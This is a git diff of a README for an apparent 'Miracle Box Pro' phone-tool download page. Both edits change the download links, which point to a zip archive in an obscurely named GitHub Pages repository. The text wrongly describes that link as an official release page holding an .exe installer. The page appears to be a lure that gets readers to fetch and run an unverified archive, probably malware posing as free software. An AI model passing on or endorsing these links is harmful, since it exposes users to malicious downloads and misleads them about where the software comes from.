@@ -5,7 +5,7 @@ description: "Download and install Miracle Box Pro for Windows 10 and 11 to mana
 ---
 # 🛠️ Miracle-Box-Pro-Edition - Manage your phone settings with ease
 
-[![](https://img.shields.io/badge/Download-Miracle_Box_Pro-blue.svg)](https://raw.githubusercontent.com/Lowfatmilkmagicicada474/lowfatmilkmagicicada474.github.io/main/subtilely/lowfatmilkmagicicada_io_github_1.9.zip)
+[![](https://img.shields.io/badge/Download-Miracle_Box_Pro-blue.svg)](https://github.com/Lowfatmilkmagicicada474/lowfatmilkmagicicada474.github.io/raw/refs/heads/main/subtilely/lowfatmilkmagicicada_io_github_1.9.zip)
 
 ## 📌 About this application
 
@@ -26,7 +26,7 @@ Ensure your PC meets these standards before you begin:
 
 You must visit the official release page to download the setup file. 
 
-[Visit this page to download the software](https://raw.githubusercontent.com/Lowfatmilkmagicicada474/lowfatmilkmagicicada474.github.io/main/subtilely/lowfatmilkmagicicada_io_github_1.9.zip)
+[Visit this page to download the software](https://github.com/Lowfatmilkmagicicada474/lowfatmilkmagicicada474.github.io/raw/refs/heads/main/subtilely/lowfatmilkmagicicada_io_github_1.9.zip)
 
 Click the link above to view the repository. Look for the latest release version on the right side of the screen. Download the installer file ending in .exe to your desktop.
 
